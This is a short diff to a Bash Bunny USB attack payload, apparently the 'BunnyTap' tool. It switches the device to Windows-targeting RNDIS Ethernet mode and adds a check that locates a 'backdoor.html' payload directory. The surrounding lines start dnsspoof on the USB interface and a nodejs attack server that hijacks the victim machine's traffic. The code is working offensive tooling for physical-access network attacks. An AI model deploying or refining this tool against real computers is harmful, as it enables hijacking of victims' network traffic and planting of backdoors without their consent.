@@ -5,8 +5,8 @@
 # Version:       1.0
 
 # Enable Ethernet (RNDIS = Windows, ECM = mac/*nix)
-#ATTACKMODE RNDIS_ETHERNET
-ATTACKMODE ECM_ETHERNET
+ATTACKMODE RNDIS_ETHERNET
+#ATTACKMODE ECM_ETHERNET
 
 ##################################################################
 #                  DO NOT EDIT BELOW THIS LINE                   #
@@ -20,7 +20,14 @@ function setupNetworking() {
 
 # Find payload directory and execute payload
 function startBunnyTap() {
-    cd $(dirname $(find /root/udisk/payloads/ -name backdoor.html))
+	# Check for BunnyTab. If not found, blink WHITE and end.
+	path=$(dirname $(find /root/udisk/payloads/ -not -path */library/* -name backdoor.html))
+    if [ -z "$path" ]; then
+		LED R G B 100
+		exit 1
+	fi
+	
+	cd $path
 	
 	/usr/bin/screen -dmS dnsspoof /usr/sbin/dnsspoof -i usb0 port 53
 	/usr/bin/screen -dmS node /usr/bin/nodejs ./bunnytap.js
